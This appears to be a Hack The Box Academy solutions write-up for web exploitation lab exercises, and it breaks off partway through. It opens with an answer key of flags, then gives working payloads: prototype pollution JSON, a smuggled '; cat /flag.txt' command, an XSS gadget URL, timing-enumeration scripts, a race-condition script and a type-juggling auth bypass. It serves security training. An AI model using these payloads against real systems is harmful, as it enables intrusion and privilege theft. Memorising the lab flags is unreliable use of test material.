| Section                               | Question Number | Answer                                |
| ------------------------------------- | --------------- | ------------------------------------- |
| Privilege Escalation                  | Question 1      | HTB{d87eb495d0d6d7d8db110b7baa70ae40} |
| Remote Code Execution                 | Question 1      | HTB{b92d441ff0595c904da50e3c3dbc92db} |
| Client-Side Prototype Pollution       | Question 1      | HTB{f92849aa47474fce058b0af0930eb4c7} |
| User Enumeration via Response Timing  | Question 1      | franki                                |
| Data Exfiltration via Response Timing | Question 1      | gretchen                              |
| Race Conditions                       | Question 1      | HTB{cc5e1efbb4e786b59684b83a370e191e} |
| Authentication Bypass                 | Question 1      | HTB{3d6074b4fd00012eac6ac7b1c4e5bd18} |
| Advanced Exploitation                 | Question 1      | HTB{96364150ec4520c703ed4eeb5ce2893d} |
| Skills Assessment                     | Question 1      | HTB{0f1479898ef23d1b6ab1e921ae4d5ca8} |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Privilege Escalation

## Question 1

### "Try to use what you learned in this section to escalate your privileges and obtain the flag."

After spawning the target machine, students first need to download [code\_proto\_privesc.zip](https://academy.hackthebox.com/storage/modules/205/code_proto_privesc.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/205/code_proto_privesc.zip && unzip code_proto_privesc.zip
```

```shell
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac-413848@htb-vwf7sb6bvj]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/205/code_proto_privesc.zip && unzip code_proto_privesc.zip

--2023-07-03 09:03:48--  https://academy.hackthebox.com/storage/modules/205/code_proto_privesc.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10150 (9.9K) [application/zip]
Saving to: ‘code_proto_privesc.zip’

code_proto_privesc.zip                  100%[=============================================================================>]   9.91K  --.-KB/s    in 0s      

2023-07-03 09:03:48 (122 MB/s) - ‘code_proto_privesc.zip’ saved [10150/10150]

Archive:  code_proto_privesc.zip
  inflating: index.js                
   creating: middleware/
  inflating: middleware/AdminMiddleware.js  
  inflating: middleware/AuthMiddleware.js  
  inflating: package.json            
   creating: routes/
<SNIP>
```

Students are highly encouraged to perform the same source code analysis as in the section to discover the vulnerabilities. The web application suffers from the same prototype pollution due to using the vulnerable [node.extend](https://www.cve.org/CVERecord?id=CVE-2018-16491) function. However, the only difference is that the POST `login` action method now requires a username and password request body parameters before the vulnerable `log` function is invoked (`routes/index.js` lines 64-76):

Code: javascript

```javascript
    router.post("/login", async (req, res) => {
        try {
            const username = req.body.username;
            const password = req.body.password;

            if (!username || !password) {
                return res
                    .status(400)
                    .send(response("Username and password are required"));
            }

            // log all login attempts for security purposes
            log(req.body);
```

To exploit this prototype pollution, students first need to register an account by visiting the `/register` endpoint and providing arbitrary data:

![[HTB Solutions/CWEE/z. images/bdc3ed10bca3c8a129301b2e5d316ee2_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/19bffb3128d7ea6213778765d80edaca_MD5.jpg]]

Subsequently, students will be redirected to log in, therefore, they need to supply the credentials used for registering and intercept the login request to send it to `Repeater`:

![[HTB Solutions/CWEE/z. images/2eedb153efb712e64ee41dc8e74ad714_MD5.jpg]]

Students need to edit the JSON payload such that it exploits the prototype pollution to pollute the `Object`'s prototype, making it have the `isAdmin` property set to `true`. Thus, this will make all registered users (and all other objects, which is ill-advised) to have the property `isAdmin` set to `true`:

Code: json

```json
{
  "username": "htb-student",
  "password": "SjN7DCdyjK86uDC",
  "__proto__": {
    "isAdmin": true
  }
}
```

![[HTB Solutions/CWEE/z. images/b63d757074d18e3bb2b82adac9f6a042_MD5.jpg]]

Then, students need to login and visit the admin dashboard over `/admin` to attain the flag `HTB{d87eb495d0d6d7d8db110b7baa70ae40}`:

![[HTB Solutions/CWEE/z. images/009107b80f58c8f8d3569c2e5db9bdeb_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/d239291a9c3098d911c3707c97956509_MD5.jpg]]

Answer: `HTB{d87eb495d0d6d7d8db110b7baa70ae40}`

# Remote Code Execution

## Question 1

### "Try to use what you learned in this section to obtain the flag."

After spawning the target machine, students first need to download [code\_proto\_rce.zip](https://academy.hackthebox.com/storage/modules/205/code_proto_rce.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/205/code_proto_rce.zip && unzip code_proto_rce.zip
```

```shell
┌─[eu-academy-1]─[10.10.15.75]─[htb-ac-413848@htb-eq5ibex8xa]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/205/code_proto_rce.zip && unzip code_proto_rce.zip

--2023-07-03 11:24:16--  https://academy.hackthebox.com/storage/modules/205/code_proto_rce.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10673 (10K) [application/zip]
Saving to: ‘code_proto_rce.zip’

code_proto_rce.zip         100%[=====================================>]  10.42K  --.-KB/s    in 0s      

2023-07-03 11:24:17 (57.7 MB/s) - ‘code_proto_rce.zip’ saved [10673/10673]

Archive:  code_proto_rce.zip
  inflating: index.js                
   creating: middleware/
  inflating: middleware/AuthMiddleware.js  
  inflating: package.json            
   creating: routes/
<SNIP>
```

Students are highly encouraged to perform the same source code analysis as in the section to discover the vulnerabilities. The web application suffers from the same command injection and prototype pollution (due to utilizing the vulnerable [loadsh.merge](https://security.snyk.io/vuln/SNYK-JS-LODASHMERGE-173732) function) vulnerabilities. However, the only difference is that there is a filter that blocks all properties containing the keyword `__proto__` before the vulnerable `merge` function is invoked (`routes/index.js` lines 110-136):

Code: javascript

```javascript
    // update user profile
    router.post("/update", AuthMiddleware, async (req, res) => {
        try {
            const sessionCookie = req.cookies.session;
            const username = jwt.verify(sessionCookie, tokenKey).username;

            // sanitize to avoid command injection
            if (req.body.deviceIP){
                if (req.body.deviceIP.match(/[^a-zA-Z0-9\.]/)) {
                    return res.status(400).send(response("Invalid Characters in DeviceIP!"));
                }
            }

            // create User object
            let userObject = new User(username);
            await userObject.init();

            // sanitize keys to avoid prototype pollution
            let sanitizedObject = {};
            for (const property in req.body) {
                if (property.includes('__proto__')) { continue; }
    
                sanitizedObject[property] = req.body[property];
            }

            // merge User object with updated properties
            _.merge(userObject, sanitizedObject);
```

This can be bypassed by instead using the `constructor` and `prototype` properties. First, students need to register an account:

![[HTB Solutions/CWEE/z. images/0f278d3c976dc3dec4aaba1cf2b2d1b2_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/67b1ff633e32b011c04778450694b661_MD5.jpg]]

Then, students need to login:

![[HTB Solutions/CWEE/z. images/5564bb9df3459f47fe179593076ff1b9_MD5.jpg]]

Afterward, students need to provide an IP address and intercept the request sent when clicking on `Update`:

![[HTB Solutions/CWEE/z. images/6455173364415c8b646154ad96752cdb_MD5.jpg]]

Students need to utilize the `constructor` and `prototype` properties to exploit the prototype pollution and inject the command `cat /flag.txt` to fetch the content of the flag file:

Code: json

```json
{
  "constructor": {
    "prototype": {
      "deviceIP": "127.0.0.1; cat /flag.txt"
    }
  },
  "password": "XVV3bM392dCWSs7"
}
```

![[HTB Solutions/CWEE/z. images/7b56766410fb5d2b9b5471b9b4cdfa7c_MD5.jpg]]

After forwarding the edited request, students need to go to `/ping` to attain the flag `HTB{b92d441ff0595c904da50e3c3dbc92db}`:

![[HTB Solutions/CWEE/z. images/8c9218445b372596f49f1060b4e6bfa4_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/9c7d15f76edab2af4f0375966eda4824_MD5.jpg]]

Answer: `HTB{b92d441ff0595c904da50e3c3dbc92db}`

# Client-Side Prototype Pollution

## Question 1

### "Try to use what you learned in this section to escalate your privileges and obtain the flag."

After spawning the target machine, students need to visit its website's root webpage and login with the credentials `htb-stdnt:Academy_student!`:

![[HTB Solutions/CWEE/z. images/7884126f51bdf6bc677d1cd9623dd0a3_MD5.jpg]]

When viewing the page's source, students will notice that the web application utilizes [jquery-deparam](https://github.com/AceMetrix/jquery-deparam), which suffers from [prototype pollution](https://security.snyk.io/vuln/SNYK-JS-JQUERYDEPARAM-1255651), and [jQuery](https://jquery.com/) version `3.5.1`:

![[HTB Solutions/CWEE/z. images/b12b43bc81a16b81aa61a299fca60e70_MD5.jpg]]

Students will notice that a redirect to `/profile.php` occurs when `Admin Dashboard` is clicked. The web application is misconfigured as it leaks the contents of the `Admin Dashboard` page. To view its contents, students need to intercept the request and not follow the redirection:

![[HTB Solutions/CWEE/z. images/249c5a968e5b6c2f5333b83f1ac6e71f_MD5.jpg]]

Analyzing the leaked admin dashboard, students will know that the admin must be coerced into clicking `/admin.php?promote=2` so that the user `htb-stdnt` gets promoted to an administrator:

![[HTB Solutions/CWEE/z. images/69e2df55b382901c246886e73fa16861_MD5.jpg]]

With the previously gathered intel, students need to use a [jQuery script gadget](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md#getscript-jquery--340) to craft and then send an XSS payload that will coerce the admin into promoting the user `htb-stdnt` to an administrator:

Code: javascript

```javascript
/profile.php?__proto__[src][]=data:,window.location%3d"/admin.php%3fpromote%3d2"//
```

![[HTB Solutions/CWEE/z. images/91255d5068eeead619c7a65cf42b39ed_MD5.jpg]]

After waiting for a few seconds, and then visiting the admin dashboard over `/admin.php`, students will attain the flag `HTB{f92849aa47474fce058b0af0930eb4c7}`:

![[HTB Solutions/CWEE/z. images/d6c523fe3f3663b9c4435080a37ea5fd_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/ef6798260a8bd946c4f19a94bd82444c_MD5.jpg]]

Answer: `HTB{f92849aa47474fce058b0af0930eb4c7}`

# User Enumeration via Response Timing

## Question 1

### "Try to use what you learned in this section to enumerate a valid username on the web application. NOTE: the source code for sending emails is not provided."

After spawning the target machine, students first need to download [code\_timing\_users.zip](https://academy.hackthebox.com/storage/modules/205/code_timing_users.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/205/code_timing_users.zip && unzip code_timing_users.zip
```

```shell
┌─[eu-academy-1]─[10.10.15.57]─[htb-ac-413848@htb-q54h2hb73d]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/205/code_timing_users.zip && unzip code_timing_users.zip

--2023-07-04 08:42:10--  https://academy.hackthebox.com/storage/modules/205/code_timing_users.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5899794 (5.6M) [application/zip]
Saving to: ‘code_timing_users.zip’

code_timing_users.zip                   100%[=============================================================================>]   5.63M  --.-KB/s    in 0.09s   

2023-07-04 08:42:10 (62.6 MB/s) - ‘code_timing_users.zip’ saved [5899794/5899794]

Archive:  code_timing_users.zip
  inflating: app.py                  
  inflating: requirements.txt        
   creating: static/
   creating: static/css/
<SNIP>
```

Students are highly encouraged to perform the same source code analysis as in the section to discover the vulnerabilities. The web application can be exploited to enumerate usernames via response timing. However, the `/login` endpoint (`app.py` lines 30-45) has been patched such that it hashes the password passed with the `bcrypt` algorithm regardless whether the username corresponds to an actual user in the database or not:

Code: python

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    
    username = request.form['username']
    pw = request.form['password']
    pw_hash = bcrypt.hashpw(pw.encode(), salt)
    user = User.query.filter_by(username=username, password=pw_hash).first()

    if user:
        session['logged_in'] = True
        session['user'] = user.username
        return redirect(url_for('index'))

    return render_template('index.html', message="Incorrect Details", type="danger")
```

Therefore, the `/login` endpoint can no longer be abused to enumerate valid usernames. Nevertheless, when analyzing the `/reset` endpoint (`app.py` lines 48-61), students will notice that if the username corresponds to an actual user in the database, the function `send_email` gets invoked, however, if not, an exception is raised, and then the generic response message is returned:

Code: python

```python
@app.route('/reset', methods=['GET', 'POST'])
def reset():
    if request.method == 'GET':
        return render_template('reset.html')

    try:
        username = request.form['username']
        user = User.query.filter_by(username=username).first()

        # send password reset email
        send_email(user.username)

    except:
        pass

    return render_template('index.html', message="If the user exists, a password reset email has been sent.", type="success")
```

The implementation of the `send_email` function is not provided, however, it suffices to know that invoking it introduces more processing time than just returning the generic response message, thus, students need to abuse this endpoint to enumerate valid usernames. First, students need to visit `/reset`, provide `htb-stdnt` as the username and intercept the request to send it to `Repeater`:

![[HTB Solutions/CWEE/z. images/ef933790c1ad954ca62c3e8fa2af4bd1_MD5.jpg]]

For valid usernames (e.g., `htb-stdnt`), the response time is approximately 0.165 seconds (165 milliseconds):

![[HTB Solutions/CWEE/z. images/f4f066e3fb6bf76b3e1ce8ff45e32c78_MD5.jpg]]

However, the response time for invalid usernames is approximately 0.006 seconds (6 milliseconds):

![[HTB Solutions/CWEE/z. images/761e83036964c1d77813dc170d460d80_MD5.jpg]]

Comparing the two approximate values, they ought to be correct/valid since, for valid usernames, an email is "sent", causing more computation (therefore requiring more processing time). In contrast, an exception is raised for invalid usernames, and no further computation occurs (therefore requiring less processing time). It is important to note that students might attain different response times due to network latency; however, the better the Internet connection is, the more accurate the response times will be.

Based on the numbers attained previously, students need to edit the script provided in the section to enumerate valid usernames. To attempt to avoid false positives due to network latency, the threshold will be increased to 0.2 seconds instead of 0.1:

Code: python

```python
import requests

URL = "http://STMIP:STMPO/reset"
WORDLIST = "./xato-net-10-million-usernames-dup.txt"
THRESHOLD_S = 0.2

with open(WORDLIST, 'r') as f:
    for username in f:
        username = username.strip()

        r = requests.post(URL, data={"username": username})
        
        if r.elapsed.total_seconds() > THRESHOLD_S:
            print(f"Valid Username found: {username}")
```

Before running the script, students need to copy over the wordlist `/opt/useful/SecLists/Usernames/xato-net-10-million-usernames-dup.txt` to the same directory of the script:

Code: shell

```shell
cp /opt/useful/SecLists/Usernames/xato-net-10-million-usernames-dup.txt ./
```

```shell
┌─[eu-academy-1]─[10.10.15.57]─[htb-ac-413848@htb-q54h2hb73d]─[~]
└──╼ [★]$ cp /opt/useful/SecLists/Usernames/xato-net-10-million-usernames-dup.txt ./
```

After running the script, students will know that `franki` is a valid username:

Code: shell

```shell
python3 solver.py
```

```shell
┌─[eu-academy-1]─[10.10.15.57]─[htb-ac-413848@htb-q54h2hb73d]─[~]
└──╼ [★]$ python3 solver.py

Valid Username found: franki
```

Answer: `franki`

# Data Exfiltration via Response Timing

## Question 1

### "Try to use what you learned in this section to enumerate a valid system username."

After spawning the target machine, students first need to download [code\_timing\_data.zip](https://academy.hackthebox.com/storage/modules/205/code_timing_data.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/205/code_timing_data.zip && unzip code_timing_data.zip
```

```shell
┌─[eu-academy-1]─[10.10.15.57]─[htb-ac-413848@htb-q54h2hb73d]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/205/code_timing_data.zip && unzip code_timing_data.zip

--2023-07-04 09:36:28--  https://academy.hackthebox.com/storage/modules/205/code_timing_data.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:157e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5899971 (5.6M) [application/zip]
Saving to: ‘code_timing_data.zip’

code_timing_data.zip                    100%[=============================================================================>]   5.63M  --.-KB/s    in 0.05s   

2023-07-04 09:36:28 (105 MB/s) - ‘code_timing_data.zip’ saved [5899971/5899971]

Archive:  code_timing_data.zip
  inflating: app.py                  
  inflating: requirements.txt        
   creating: static/
   creating: static/css/
  inflating: static/css/main.css     
  inflating: static/css/util.css
<SNIP>
```

Students are highly encouraged to perform the same source code analysis as in the section to discover the vulnerabilities. The web application can be exploited to exfiltrate data via response timing. In this case, students only need to find an appropriate threshold value.

To do so, students need to login with the credentials `htb-stdnt:Academy_student!`:

![[HTB Solutions/CWEE/z. images/6325ab55b17d1e61610151d5187df49b_MD5.jpg]]

Then, students need to intercept the request when clicking on `FILECHECK` and send it to `Repeater`:

![[HTB Solutions/CWEE/z. images/e2db78af46627ee54a78f2f240fc22c1_MD5.jpg]]

For valid system usernames, the response time is approximately 0.020 seconds (20 milliseconds):

![[HTB Solutions/CWEE/z. images/81490964d7288cfc0e7e1b9d47ec3859_MD5.jpg]]

However, the response time for invalid system usernames is approximately 0.005 seconds (5 milliseconds):

![[HTB Solutions/CWEE/z. images/61b4cd495bbd7a87048efcac8ca5dcbc_MD5.jpg]]

Comparing the two approximate values, they ought to be correct/valid because for existing system usernames, the `get_file_details` function consumes more processing time since it:

- Calculates the number of subfiles of the user's home directory by recursively getting the number of files in each subfolder using the `os.walk` function.
- Recursively computes the size of the file and all subfiles in case the path is a directory.

In contrast, the `get_file_details` function returns nothing for invalid usernames (because they do not have a home directory), and no further computation occurs (therefore requiring less processing time). It is important to note that students might attain different response times due to network latency; however, the better the Internet connection is, the more accurate the response times will be.

The threshold value is not deterministic since the number of files for the target (valid) system username is unknown. Therefore, tinkering with it might be necessary:

Code: python

```python
import requests

URL = "http://STMIP:STMPO/filecheck"
cookies =  {"session": "eyJsb2dnZWRfaW4iOnRydWUsInVzZXIiOiJodGItc3RkbnQifQ.ZKP92w.Yww3amtjrERuRVcJbv6RRsmQWck"}
WORDLIST = "./xato-net-10-million-usernames-dup.txt"
THRESHOLD_S = 0.020

with open(WORDLIST, 'r') as f:
    for username in f:
        username = username.strip()

        r = requests.get(URL, params={"filepath": f"/home/{username}/"}, cookies=cookies)

        if r.elapsed.total_seconds() > THRESHOLD_S:
            print(f"Valid Username found: {username}")
```

Before running the script, students need to copy over the wordlist `/opt/useful/SecLists/Usernames/xato-net-10-million-usernames-dup.txt` to the same directory of the script:

Code: shell

```shell
cp /opt/useful/SecLists/Usernames/xato-net-10-million-usernames-dup.txt ./
```

```shell
┌─[eu-academy-1]─[10.10.15.57]─[htb-ac-413848@htb-q54h2hb73d]─[~]
└──╼ [★]$ cp /opt/useful/SecLists/Usernames/xato-net-10-million-usernames-dup.txt ./
```

After running the script and waiting for output, students will know that `gretchen` is a valid username (if other usernames appear, they are false positives caused by network latency):

Code: shell

```shell
python3 solver.py
```

```shell
┌─[eu-academy-1]─[10.10.14.232]─[htb-ac-8414@htb-ntxxtwpx58]─[~]
└──╼ [★]$ python3 solver.py

Valid Username found: gretchen
```

Answer: `gretchen`

# Race Conditions

## Question 1

### "Try to use what you learned in this section to exploit a race condition and obtain the flag."

After spawning the target machine, students first need to download [code\_racecondition.zip](https://academy.hackthebox.com/storage/modules/205/code_racecondition.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/205/code_racecondition.zip && unzip code_racecondition.zip
```

```shell
┌─[eu-academy-1]─[10.10.14.201]─[htb-ac-413848@htb-fady1mohrj]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/205/code_racecondition.zip && unzip code_racecondition.zip

--2023-07-04 23:40:13--  https://academy.hackthebox.com/storage/modules/205/code_racecondition.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.21.126, 104.18.20.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.21.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 148101 (145K) [application/zip]
Saving to: ‘code_racecondition.zip’

code_racecondition.zip                  100%[=============================================================================>] 144.63K  --.-KB/s    in 0.004s  

2023-07-04 23:40:13 (39.3 MB/s) - ‘code_racecondition.zip’ saved [148101/148101]

Archive:  code_racecondition.zip
   creating: racecondition/
   creating: racecondition/.vscode/
  inflating: racecondition/.vscode/settings.json  
  inflating: racecondition/Dockerfile  
  inflating: racecondition/db.sql
<SNIP>
```

Students are highly encouraged to perform the same source code analysis as in the section to discover the vulnerabilities. The web application suffers from a race condition, however, not when redeeming codes, as that is now patched with SQL locks (line 202 in `racecondition/src/config.php`):

Code: php

```php
function redeem_gift_card($username, $code) {
    // prevent race condition by locking tables
    lock_db($code);

    $gift_card_balance = check_gift_card_balance($code);

    if ($gift_card_balance === 0) {
        return "Invalid Gift Card Code!";
    }

    // update user balance
    $user = fetch_user_data($username);
    $new_balance = $user['balance'] + $gift_card_balance;
    update_user_balance($username, $new_balance);

    // invalidate code
    invalidate_gift_card($code);

    // release table lock
    unlock_db();

    return "Successfully redeemed gift card. Your new balance is: " . $new_balance . '$';
}
```

The implementation of `lock_db` is found in the same file, lines 224-229:

Code: php

```php
function lock_db($code){
    global $conn;

    $sql = "LOCK TABLES active_gift_cards WRITE, users WRITE;";
    mysqli_query($conn, $sql);
}
```

However, students will notice that the `buy_product` function does not implement SQL locks and therefore suffers from a race condition; multiple gift cards can be bought with the same balance:

Code: php

```php
function buy_product($username, $product_id) {
	global $conn;

    $user = fetch_user_data($username);
    $product = fetch_product_data($product_id);

    // check balance
    $new_balance = $user['balance'] - $product['price'];
    if ($new_balance < 0) {
        return 'Insufficient Balance';
    }

    update_user_balance($username, $new_balance);

    // gift card
    if (intval($product_id) === 1) {
        return $product['description'] . buy_gift_card($product['price']);
    }

    return $product['description'];
}
```

Students can visualize the race condition vulnerability by depicting how two different web server threads will handle two gift-codes-buying requests sent in rapid succession:

| Thread 1 | Thread 2 |
| --- | --- |
| `$user = fetch_user_data($username);` |  |
| `$product = fetch_product_data($product_id);` |  |
| `$new_balance = $user['balance'] - $product['price'];` |  |
|  | `$user = fetch_user_data($username);` |
|  | `$product = fetch_product_data($product_id);` |
|  | `$new_balance = $user['balance'] - $product['price'];` |
| `update_user_balance($username, $new_balance);` |  |
|  | `update_user_balance($username, $new_balance);` |

To exploit this race condition, in `Burp Suite`, students need to click on `Extender` ---> `BApp Store` and then install `Turbo Intruder`:

![[HTB Solutions/CWEE/z. images/c2d80d73248a614033917dd84e5086f0_MD5.jpg]]

Subsequently, students need to sign in with the credentials `htb-stdnt:Academy_student!`:

![[HTB Solutions/CWEE/z. images/647196a65614664ac11f652e294dcb1c_MD5.jpg]]

Students will notice that the user initially has a 10$ balance, and that gift cards cost 10$, with the flag costing 100$:

![[HTB Solutions/CWEE/z. images/633bd5658222db646b4591cdf75c4013_MD5.jpg]]

To bypass the locks on PHP's session files and exploit the race condition, students need to attain a handful of different PHP session IDs (the more the better) by intercepting the login request and saving the value of `PHPSESSID` returned in the response (in case there is a `Cookie` header present within the first request, students need to remove it):

![[HTB Solutions/CWEE/z. images/00e115ddcefae1c24b3c8a7eca0880b0_MD5.jpg]]

After repeating the process a number of times, students need to sign in again and then intercept the request for buying a gift card:

![[HTB Solutions/CWEE/z. images/83efb3be4ffd35f9288e4d49d7113df1_MD5.jpg]]

Before dropping the request, students need to send it to `Turbo Intruder`:

![[HTB Solutions/CWEE/z. images/da99d5d0864df6e82b8347728f58c838_MD5.jpg]]

Within `Turbo Intruder`, students need to choose `example/race.py` from the drop-down list:

![[HTB Solutions/CWEE/z. images/9bb53d37b45e713d0b0449b68e2bbd2e_MD5.jpg]]

Subsequently, students need to set `PHPSESSID` to `%s` so that `Turbo Intruder` inserts the payload (i.e., session values) there:

Code: http

```http
Cookie: PHPSESSID=%s
```

![[HTB Solutions/CWEE/z. images/ac84df4c27c0b276f7c73e8fbc20f58f_MD5.jpg]]

Moreover, students need to edit the Python script so that it uses the session IDs attained previously to perform the attack:

Code: python

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    # the 'gate' argument blocks the final byte of each request until openGate is invoked
    for sess in ["d4op2eik5tj1tr9k1m3n0e9u46", "b9j7dqeeqkvksqnlfrfr2p4ess", "ofva3tc5ac7t4vvtbr3fe3lfnu", "uobr722pmc5eo6iv66b101qrv6",
                "jvdjve07ah6p569i7kiiu1lini", "1075umvid42uh9ci93cq673nr1", "nqqshn3o4l5sn7i2lmjprspibl", "0hibr9uue7ud89j6pqo93uthut",
                "76mdseshfdl639g26amelkcvhd","ot5ca9mdgl5euenshe9o9g8dql"]:
        engine.queue(target.req, sess, gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

![[HTB Solutions/CWEE/z. images/f607ff3698755e04d1155d6e59ff00b1_MD5.jpg]]

Then, students need to click on `Attack`:

![[HTB Solutions/CWEE/z. images/bb833bf474582d6d20d38a6220073442_MD5.jpg]]

After `Turbo Intruder` has finished, students need to check all the responses for redeemable gift codes and redeem the codes on the website:

![[HTB Solutions/CWEE/z. images/2d90fbb4fdd135e8b0b7b1b63676d9aa_MD5.jpg]]

Since not all responses might have gift codes (as eventually the balance will be updated), students need to repeat the attack to attain more gift codes:

![[HTB Solutions/CWEE/z. images/9dc98f6051b3d73ebabf2669cebeb0e5_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/7f97e579c0674038e8da5ff51390c36a_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/a64c77cb5b4206bad1a57083763f88a1_MD5.jpg]]

At last, when reaching a 100$ balance, students need to buy the flag, attaining `HTB{cc5e1efbb4e786b59684b83a370e191e}`:

![[HTB Solutions/CWEE/z. images/30e66a7ab21b39c09d4c9950c057b635_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/2ce3f7ad6157d70ae8c085d191d45137_MD5.jpg]]

Answer: `HTB{cc5e1efbb4e786b59684b83a370e191e}`

# Authentication Bypass

## Question 1

### "Try to use what you learned in this section to access the admin panel and obtain the flag."

After spawning the target machine, students first need to download [code\_typejuggling\_authbypass.zip](https://academy.hackthebox.com/storage/modules/205/code_typejuggling_authbypass.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/205/code_typejuggling_authbypass.zip && unzip code_typejuggling_authbypass.zip
```

```shell
┌─[eu-academy-1]─[10.10.14.41]─[htb-ac-413848@htb-aemgdibs7u]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/205/code_typejuggling_authbypass.zip && unzip code_typejuggling_authbypass.zip

--2023-07-05 14:43:36--  https://academy.hackthebox.com/storage/modules/205/code_typejuggling_authbypass.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 23768 (23K) [application/zip]
Saving to: ‘code_typejuggling_authbypass.zip’

code_typejuggling_authbypass.zip        100%[=============================================================================>]  23.21K  --.-KB/s    in 0s      

2023-07-05 14:43:36 (142 MB/s) - ‘code_typejuggling_authbypass.zip’ saved [23768/23768]

Archive:  code_typejuggling_authbypass.zip
  inflating: bootstrap.min.css       
  inflating: config.php              
  inflating: index.php               
  inflating: profile.php             
  inflating: script.js               
  inflating: style.css 
```

Students are highly encouraged to perform the same source code analysis as in the section to discover the vulnerabilities. The web application suffers from the same two type juggling vulnerabilities. However, the only difference is that the web application hashes the password passed within the request body, as in `index.php` lines 13-19:

Code: php

```php
    // implement password hash since it's more secure
    if (pw_hash($data['password']) == $user['password']){
        $_SESSION['username'] = $data['username'];
        $_SESSION['loggedin'] = True;
        echo "Success";
        exit;
    }
```

The implementation of `pw_hash` is found within `config.php`, lines 40-42:

Code: php

```php
function pw_hash($password){
    return hash('sha256', $password);
}
```

Therefore, using a password of 0 will not work. However, passing an empty array as the password will cause the hashing function to return `null`, and passing a nonexistent username will effectively bypass the authentication mechanism since it exploits the first type juggling vulnerability by making the comparison `null == null` evaluate to `true`. Passing a username with `admin` as a substring that makes the function [strpos](https://www.php.net/manual/en/function.strpos.php) return any positive non-zero value exploits the second type juggling vulnerability in `profile.php`, lines 12-14, and escalates privileges to that of the admin user.

Students need to intercept the request when signing in, remove the `Cookie` header and its value, and edit the JSON request body to exploit the two type juggling vulnerabilities:

Code: json

```json
{
	"username":"NONCEadmin",
	"password":[
	]
}
```

![[HTB Solutions/CWEE/z. images/ffcb8bc636b3e59b020c28edc1e71883_MD5.jpg]]

With the attained admin session cookie, students need to sign in again using the credentials `htb-stdnt:Academy_student!` and then use `Cookie Editor` to replace the cookie value with the admin's user. After saving the new cookie value and refreshing the page, students will attain the flag `HTB{3d6074b4fd00012eac6ac7b1c4e5bd18}`:

![[HTB Solutions/CWEE/z. images/5a6d274ba43731befdfd4c3aa40e79ef_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/f4311dd3f8409159663edcc7b996b496_MD5.jpg]]

Answer: `HTB{3d6074b4fd00012eac6ac7b1c4e5bd18}`

# Advanced Exploitation

## Question 1

### "Try to use what you learned in this section to obtain the flag."

After spawning the target machine, students first need to download [code\_typejuggling\_advanced.zip](https://academy.hackthebox.com/storage/modules/205/code_typejuggling_advanced.zip) and then unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/205/code_typejuggling_advanced.zip && unzip code_typejuggling_advanced.zip
```

```shell
┌─[eu-academy-1]─[10.10.14.41]─[htb-ac-413848@htb-xgpgjbdpzh]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/205/code_typejuggling_advanced.zip && unzip code_typejuggling_advanced.zip

